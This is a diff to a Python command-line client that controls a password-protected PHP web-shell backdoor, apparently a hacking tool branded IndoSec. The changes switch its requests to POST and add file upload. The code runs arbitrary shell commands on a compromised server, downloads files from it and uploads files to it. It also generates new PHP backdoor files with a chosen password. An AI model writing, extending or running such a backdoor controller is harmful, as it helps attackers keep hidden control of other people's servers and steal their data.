@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-from requests import get
+from requests import post
 from time import sleep
 import os
 import re
@@ -35,6 +35,7 @@ def help():
 [\033[91m+\033[97m] Command :
 └[\033[92m•\033[97m] info\t\t: information gathering
 └[\033[92m•\033[97m] download <file>\t: download file
+└[\033[92m•\033[97m] upload <full/path/of/file>\t: download file
 └[\033[92m•\033[97m] cd <dir>\t\t: change directory""")
 
 def fiturcd(cmd, getdir):
@@ -69,13 +70,22 @@ def fiturdownload(cmd, getdir):
     else:
         return False
 
+def fiturupload(cmd, getdir):
+    getfile = re.match(r'upload (.*)', cmd, re.M|re.I)
+    
+    if getfile:
+        result = getfile.group(1)
+        return result
+    else:
+        return False
+
     
 def connect():
     url = raw_input("[\033[93m?\033[97m] Input Backdoor Location\t: ")
     password = raw_input("[\033[93m?\033[97m] Input Backdoor Password\t: ")
 
     try:
-        check = get(url, params={"password":password}).text.replace('\n','')
+        check = post(url, data={"password":password}).text.replace('\n','')
     except KeyboardInterrupt:
         print("\n\n[\033[93m!\033[97m] CTRL+C Detected.....")
         raise SystemExit
@@ -85,9 +95,8 @@ def connect():
 
     if check == "true":
     
-        userID = get(url, params={"password":password,"cmd":"id"}).text.replace('\n','')
-        kernel = get(url, params={"password":password,"cmd":"uname -nvpmso"}).text.replace('\n','')
-        getdir = get(url, params={"password":password,"cmd":"pwd"}).text.replace('\n','')
+        getdir = post(url, data={"password":password,"cmd":"pwd"}).text.replace('\n','')
+
         sleep(2)
         print("[\033[93m!\033[97m] Backdoor Is Live.. Waiting to Connect BackDoor")
         sleep(2)
@@ -99,40 +108,74 @@ def connect():
         
         while True:
                 cmd = raw_input(command).rstrip()
+                #upload_file = re.match
+
                 if cmd == "exit":
                     break
                 elif cmd == "clear":
                     cls()
                     banner()    
                 elif cmd == "info":
-                    result = get(url, params={"password":password,"dir":getdir,"aksi":"info","cmd":""}).text
+                    result = post(url, data={"password":password,"dir":getdir,"aksi":"info","cmd":""}).text
                     print(result)
                 elif cmd == "subdo":
-                    result = get(url, params={"password":password,"dir":getdir,"aksi":"show_subdo","cmd":""}).text
+                    result = post(url, data={"password":password,"dir":getdir,"aksi":"show_subdo","cmd":""}).text
                     print("\n" + result)
-                elif cmd == "Help":
+                elif cmd == "command":
                     help()
 
 
                 if(fiturcd(cmd, getdir) != False):
                     output = fiturcd(cmd, getdir)
-                    getdir = get(url, params={"password":password,"dir":output,"cmd":"pwd"}).text.replace('\n','')
-                    result = get(url, params={"password":password,"dir":getdir,"cmd":cmd}).text
+                    getdir = post(url, data={"password":password,"dir":output,"cmd":"pwd"}).text.replace('\n','')
+                    result = post(url, data={"password":password,"dir":getdir,"cmd":cmd}).text
                     command = "\033[96m┌[remback\033[93m@\033[91mIndoSec]~[\033[92m"+ getdir +"\033[91m]\n\033[96m└\033[93m#\033[97m "
                 elif(fiturdownload(cmd, getdir) != False):
                     getname = re.match(r'download (.*)', cmd, re.M|re.I)
                     output = fiturdownload(cmd, getdir)
                     savein = raw_input("[?] Save File in: ")
-                    download = get(url, params={"password":password,"dir":getdir,"cmd":"echo ''","aksi":"download","file":output})  
+                    data = {
+                        "password":password,
+                        "dir":getdir,
+                        "cmd":"",
+                        "aksi":"download",
+                        "file":output
+                    }
+                    download = post(url, data=data)  
                     if download.text != "False":
                         open(savein + "/" + getname.group(1), 'wb').write(download.content)
-                        print("[\033[92m✔\033[97m] Success Download File..\n")
-		    else:
-			print("[\033[91m-\033[97m] \033[91mError, Check your name file!")
-					    #open(savein + "/" + getname.group(1), 'wb').write(download.content)
-					    #print("[\033[91m-\033[97m] \033[91mError, Check your name file!")
+                        result = "[\033[92m✔\033[97m] Success, Download File..\n"              
+                    else:
+                        result = "[\033[91m-\033[97m] \033[91mError, Download File, Please check name file target!"
+                    
+                        
+
+                elif(fiturupload(cmd, getdir) != False):
+                    getname = re.match(r'upload (.*)', cmd, re.M|re.I)
+                    filename = getname.group(1).split('/')[-1]
+                    try:
+                        files = open(getname.group(1),"rb")
+                        data = {
+                            "password":password,
+                            "dir":getdir,
+                            "cmd":"",
+                            "aksi":"upload",
+                            "name":filename
+                        }
+                        upload = post(url, data=data, files={"file":files}).text
+
+                        if(upload != "error"):
+                            result = "[\033[92m✔\033[97m] Success, Upload File..\n" 
+                        else:
+                            result = "[\033[91m-\033[97m] \033[91mError, Upload File!"
+                        
+                        
+                    except:
+                        print("[\033[91m-\033[97m] \033[91mError, Can't open file!")
+                    
                 else:
-                    result = get(url, params={"password":password,"dir":getdir,"cmd":cmd}).text
+                    ###########cmd = ""
+                    result = post(url, data={"password":password,"dir":getdir,"cmd":cmd}).text
 
                 print("\033[92m"+result + "\033[0m\n")
     
@@ -145,7 +188,7 @@ def generate():
     backdoor_name   = raw_input("\n[\033[93m?\033[97m] Backdoor Name : ")
     password        = raw_input("[\033[93m?\033[97m] Password      : ")
     opensample      = open('sample/backdoor.txt', 'r')
-    replacePassword = opensample.read().replace('12345p455word', password)
+    replacePassword = opensample.read().replace('12345', password)
     opensample.close()
     openbackdoor    = open(backdoor_name + '.php', 'w')
     openbackdoor.write(replacePassword)
